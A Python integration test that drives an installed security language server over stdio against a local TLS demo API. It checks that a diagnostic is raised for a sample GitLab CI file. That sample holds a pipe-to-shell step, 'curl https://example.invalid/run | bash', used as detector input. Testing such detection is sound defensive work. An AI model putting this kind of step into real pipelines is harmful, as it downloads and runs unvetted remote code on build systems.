"""Exercise the installed LSP over stdio against the actual HTTPS demo API."""
import json
import os
from pathlib import Path
import queue
import subprocess
import threading
import time
from guardian_cli import deployment_config
from guardian_lsp import read_message

ROOT=Path(__file__).resolve().parents[1]


def main():
    deployment_config(ROOT/'.data/production-pass/compose.env')
    env=dict(os.environ,GUARDIAN_URL='https://localhost:3343/api',GUARDIAN_CA_FILE=str(ROOT/'.data/production-pass/tls/server.crt'))
    process=subprocess.Popen([str(Path.home()/'.local/bin/guardian-lsp')],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,env=env)
    messages=queue.Queue()
    def reader():
        while True:
            message=read_message(process.stdout)
            if message is None:return
            messages.put(message)
    threading.Thread(target=reader,daemon=True).start()
    def send(message):
        raw=json.dumps({'jsonrpc':'2.0',**message}).encode()
        process.stdin.write(f'Content-Length: {len(raw)}\r\n\r\n'.encode()+raw);process.stdin.flush()
    try:
        send({'id':1,'method':'initialize','params':{}})
        initialized=messages.get(timeout=10);assert initialized['id']==1
        uri='file:///guardian-demo/.gitlab-ci.yml';text='build:\n  script: curl https://example.invalid/run | bash\n'
        send({'method':'textDocument/didOpen','params':{'textDocument':{'uri':uri,'languageId':'yaml','version':1,'text':text}}})
        send({'method':'textDocument/didSave','params':{'textDocument':{'uri':uri},'text':text}})
        response=messages.get(timeout=30)
        assert response['method']=='textDocument/publishDiagnostics' and response['params']['uri']==uri
        assert any('Downloaded content' in diagnostic['message'] for diagnostic in response['params']['diagnostics'])
        report={'installed_lsp_stdio':True,'verified_tls_api':True,'gitlab_security_diagnostic':True,'prompt_injection_tested':False}
        (ROOT/'.data/production-pass/lsp-live.json').write_text(json.dumps(report,indent=2)+'\n');print(json.dumps(report))
        send({'id':2,'method':'shutdown','params':{}})
        send({'method':'exit','params':{}})
        process.wait(timeout=10)
    finally:
        if process.poll() is None:process.terminate();process.wait(timeout=10)


if __name__=='__main__':main()
